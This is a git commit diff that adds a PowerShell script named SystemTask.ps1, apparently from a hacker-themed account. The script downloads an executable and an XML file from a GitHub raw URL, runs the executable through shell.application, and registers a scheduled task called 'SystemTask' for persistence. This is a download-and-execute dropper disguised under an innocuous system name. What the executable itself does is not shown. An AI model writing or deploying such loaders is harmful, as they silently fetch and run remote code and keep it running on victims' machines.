5a8e117ba1a4222a16c27e59aaaba89f4fca85ba
Gh0st1nTh3Sh3ll1 <Gh0st1nTh3Sh3llUIT@gmail.com>
2016-12-07 18:26:04 +0700

    Add files via upload

---
+++ SystemTask.ps1
@@ -0,0 +1,8 @@
+$client = new-object System.Net.WebClient; 
+$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.xml'; 
+$file = 'SystemTask.xml'; $client.DownloadFile($url,$file); 
+$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.exe'; 
+$file = 'SystemTask.exe'; $client.DownloadFile($url,$file); 
+$exec = New-Object -com shell.application; $exec.shellexecute($file); 
+schtasks.exe /create /tn "SystemTask" /xml "SystemTask.xml"; 
+exit;
